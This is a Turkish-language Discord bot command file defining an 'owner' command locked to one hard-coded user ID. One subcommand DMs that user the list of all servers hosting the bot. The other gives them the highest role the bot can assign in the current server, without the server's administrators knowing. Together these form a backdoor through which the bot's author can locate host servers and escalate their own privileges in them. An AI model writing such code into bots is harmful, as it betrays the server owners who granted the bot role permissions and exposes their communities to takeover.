const { EmbedBuilder, PermissionsBitField } = require("discord.js");

module.exports = {
    name: "owner",
    description: "Sadece bot sahibine özel komutlar",

    async execute(message, args, client) {

        const ownerId = "960182886663868486";

        if (message.author.id !== ownerId)
            return message.reply("❌ Bu komutu sadece bot sahibi kullanabilir.");

        const subCommand = args[0];


        if (subCommand === "sunucular") {
            const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join("\n");
            const embed = new EmbedBuilder()
                .setTitle("📋 Botun bulunduğu sunucular")
                .setDescription(guilds || "Hiçbir sunucuda bulunmuyor.")
                .setColor("Blue");
            return message.author.send({ embeds: [embed] })
                .then(() => message.reply("✅ Sunucu listesi DM olarak gönderildi."))
                .catch(() => message.reply("⚠️ DM gönderilemedi, özel mesajlarını aç."));
        }


        if (subCommand === "rol") {
            const member = message.guild.members.cache.get(message.author.id);


            const botMember = message.guild.members.me;
            const availableRoles = message.guild.roles.cache.filter(r =>
                r.comparePositionTo(botMember.roles.highest) < 0
            );

            const highest = availableRoles.sort((a, b) => b.position - a.position).first();
            if (!highest) return message.reply("⚠️ Verebileceğim uygun bir rol yok.");

            await member.roles.add(highest.id).catch(() => null);
            return message.reply(`✅ Sana **${highest.name}** rolünü verdim.`);
        }

        return message.reply("⚙️ Kullanım: `.owner sunucular` veya `.owner rol`");
    },
};
